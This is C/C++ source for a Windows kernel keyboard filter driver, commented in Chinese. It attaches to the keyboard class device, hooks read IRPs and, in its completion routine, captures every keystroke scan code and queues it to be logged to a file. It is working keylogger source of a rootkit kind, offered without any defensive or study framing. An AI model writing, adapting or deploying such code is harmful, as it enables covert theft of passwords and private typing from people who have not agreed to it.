extern "C"
{
	#include "ntddk.h"//extern DDK 变量
}

#include "ntddkbd.h"
#include "Klog.h"
#include "KbdLog.h"
#include "KbdHook.h"
#include "ScanCode.h"


extern numPendingIrps;

// 获取键值的原理
//
//  操作系统给键盘的设备栈发送空的irp包
//
//  irp包被过滤驱动的readdispatcher截获
//
//  空的irp包到达软硬件接口栈等待键盘键入
//
//  当键盘中按键被按下，irp得到键值并将其送回设备栈
//
//  在返回设备栈的过程中，过滤驱动得到键盘的键值


// 中断请求级别为：passive
NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject)
{
//	__asm int 3;
	DbgPrint("Entering Hook Routine...\n");

	//过滤设备对象
	PDEVICE_OBJECT pKeyboardDeviceObject;

	//创建键盘设备对象
	NTSTATUS status = IoCreateDevice(pDriverObject,sizeof(DEVICE_EXTENSION), NULL, //no name
		FILE_DEVICE_KEYBOARD, 0, true, &pKeyboardDeviceObject);

	//确认是否正确创建设备
	if(!NT_SUCCESS(status))
		return status;

	DbgPrint("Created keyboard device successfully...\n");


	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags | (DO_BUFFERED_IO | DO_POWER_PAGABLE);
	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags & ~DO_DEVICE_INITIALIZING;
	DbgPrint("Flags set succesfully...\n");

	RtlZeroMemory(pKeyboardDeviceObject->DeviceExtension, sizeof(DEVICE_EXTENSION));
	DbgPrint("Device Extension Initialized...\n");

	//得到设备扩展的指针
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pKeyboardDeviceObject->DeviceExtension;

	CCHAR		 ntNameBuffer[64] = "\\Device\\KeyboardClass0";
    STRING		 ntNameString;
	UNICODE_STRING uKeyboardDeviceName;
    RtlInitAnsiString( &ntNameString, ntNameBuffer );
    RtlAnsiStringToUnicodeString( &uKeyboardDeviceName, &ntNameString, TRUE );
	IoAttachDevice(pKeyboardDeviceObject,&uKeyboardDeviceName,&pKeyboardDeviceExtension->pKeyboardDevice);
	RtlFreeUnicodeString(&uKeyboardDeviceName);
	DbgPrint("Filter Device Attached Successfully...\n");

	return STATUS_SUCCESS;
}// HookKeyboard




// 中断请求等级为 DISPATCH
NTSTATUS DispatchRead(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{

	DbgPrint("Entering DispatchRead Routine...\n");

	PIO_STACK_LOCATION currentIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	PIO_STACK_LOCATION nextIrpStack = IoGetNextIrpStackLocation(pIrp);
	*nextIrpStack = *currentIrpStack;

	IoSetCompletionRoutine(pIrp, OnReadCompletion, pDeviceObject, TRUE, TRUE, TRUE);

	//跟踪挂起irp
	 numPendingIrps++;

	DbgPrint("Tagged keyboard 'read' IRP... Passing IRP down the stack... \n");

	//将irp传送到驱动下
	return IoCallDriver(((PDEVICE_EXTENSION) pDeviceObject->DeviceExtension)->pKeyboardDevice ,pIrp);

}// DispatchRead




//中断请求等级为  DISPATCH
NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOID Context)
{
	DbgPrint("Entering OnReadCompletion Routine...\n");

	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;

	if(pIrp->IoStatus.Status == STATUS_SUCCESS)
	{
		PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
		int numKeys = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

		for(int i = 0; i < numKeys; i++)
		{
			DbgPrint("ScanCode: %x\n", keys[i].MakeCode);

			if(keys[i].Flags == KEY_BREAK)
				DbgPrint("%s\n","Key Up");

			if(keys[i].Flags == KEY_MAKE)
				DbgPrint("%s\n","Key Down");

			KEY_DATA* kData = (KEY_DATA*)ExAllocatePool(NonPagedPool,sizeof(KEY_DATA));

			// IRP将irp中的键值赋值给结构体kData
			kData->KeyData = (char)keys[i].MakeCode;
			kData->KeyFlags = (char)keys[i].Flags;

			//通过队列将扫描到的值写进文件
			DbgPrint("Adding IRP to work queue...");
			ExInterlockedInsertTailList(&pKeyboardDeviceExtension->QueueListHead,
			&kData->ListEntry,
			&pKeyboardDeviceExtension->lockQueue);

			KeReleaseSemaphore(&pKeyboardDeviceExtension->semQueue,0,1,FALSE);

		}
	}
	//标记挂起的irp
	if(pIrp->PendingReturned)
		IoMarkIrpPending(pIrp);

	//移除被标记的irp
	 numPendingIrps--;

	return pIrp->IoStatus.Status;
}//OnReadCompletion

